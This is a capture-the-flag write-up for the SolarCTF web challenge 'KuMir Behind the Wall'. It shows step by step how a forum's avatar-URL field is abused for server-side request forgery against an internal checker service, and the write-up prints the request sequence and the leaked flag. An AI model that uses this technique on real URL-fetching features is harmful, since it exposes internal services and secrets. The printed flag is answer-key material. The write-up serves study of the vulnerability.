# KuMir Behind the Wall

**Event:** SolarCTF
**Category:** web
**Flag:** `SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}`

---

FLAG: SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}

# KuMir Behind the Wall - Writeup

## Challenge

Category: Web

> The Robot hit a wall, the homework wasn't saved, and the admin is fixing the printer. After
> the school server migration, the reference answer for the final assignment `robot-final` went
> missing. Explore the Kletochka forum and recover it before the teacher schedules a retake.

Target: `https://kumir-behind-the-wall.solarctf.ru`

## Architecture

From `docker-compose.yml`:

- **web** - Flask/gunicorn on port 8000, on networks `govnonet` (internal) and `edge` (public)
- **kumir-checker** - on `govnonet` only, health at `http://127.0.0.1:8081/health`

The `govnonet` network is `internal: true`, so `kumir-checker` is unreachable from the internet
but reachable from the `web` service. Classic SSRF setup.

## Recon - Forum Breadcrumbs

### 1. The target: checker API

In `/topic/final-work`, post #2 by `admin_7b` reveals:

```
проверяльщик: http://kumir-checker:8081
итоговая работа: robot-final
```

The checker is on the internal network. The assignment we need is `robot-final`.

### 2. The SSRF vector: avatar URL

In `/topic/avatar` and `/profile`, the forum lets users set an avatar by URL:

```html
<form method="post" action="/profile/avatar">
  <input name="avatar_url" type="text" placeholder="https://...">
</form>
```

The avatar is then proxied through `/api/avatar/me`:

```html
<img class="avatar-preview" src="/api/avatar/me" alt="...">
```

The server fetches the user-supplied URL server-side and proxies the response body through
`/api/avatar/me`. This is a **Server-Side Request Forgery (SSRF)** vector.

### 3. Teacher hint about error reports

In `/topic/final-work`, post #3, the teacher says:

> На неверный ответ проверяльщик пишет подробно - специально для преподавателя.

("The checker writes detailed reports for wrong answers - specifically for the teacher.")

This hints that submitting a wrong answer yields useful information.

## Exploitation

### Step 1: Confirm SSRF via health endpoint

Set avatar URL to the checker's health endpoint:

```
POST /profile/avatar
avatar_url=http://kumir-checker:8081/health
```

Then fetch `/api/avatar/me`:

```
GET /api/avatar/me
→ {"ok": true, "runtime": "Kumir 2"}
```

SSRF confirmed - the web app fetches internal URLs and returns their content.

### Step 2: Discover the checker API

Set avatar URL to the checker root:

```
POST /profile/avatar
avatar_url=http://kumir-checker:8081/
```

Response via `/api/avatar/me`:

```json
{
  "diagnostic": "Kumir 2 teacher checker\nGET /teacher/check?task=robot-final&answer=<one-line answer>\nContent-Type: not required; parameters go in the query string\nCorrect answer: 200, OK. Wrong answer: 422, teacher report.\n"
}
```

The API is: `GET /teacher/check?task=robot-final&answer=<answer>`
- Correct: 200
- Wrong: 422 with a "teacher report"

### Step 3: Submit a wrong answer to get the teacher report

Set avatar URL to the checker with a wrong answer. The `&` in the URL must be properly
encoded in the POST body (use `--data-urlencode` with curl):

```
POST /profile/avatar
avatar_url=http://kumir-checker:8081/teacher/check?task=robot-final&answer=test
```

Then fetch `/api/avatar/me`:

```
HTTP/1.1 422 UNPROCESSABLE ENTITY
Content-Type: application/octet-stream

{"verdict": "WA", "expected": "SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}", "received": "test"}
```

The checker's "teacher report" for wrong answers includes the expected answer directly.

### Step 4: Verify the flag

Submit the correct answer:

```
POST /profile/avatar
avatar_url=http://kumir-checker:8081/teacher/check?task=robot-final&answer=SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}
```

Response via `/api/avatar/me`:

```
HTTP/1.1 200 OK

{"verdict": "OK"}
```

## Vulnerability Class

**SSRF (Server-Side Request Forgery)** - The avatar URL feature allows users to specify
arbitrary URLs, which the server fetches without restricting the target to external hosts.
This allows access to internal services on the `govnonet` network that are otherwise
unreachable from the internet.

## Flag

```
SOLARCTF{n3_s0tv0r1_s3b3_kum1r4}
```
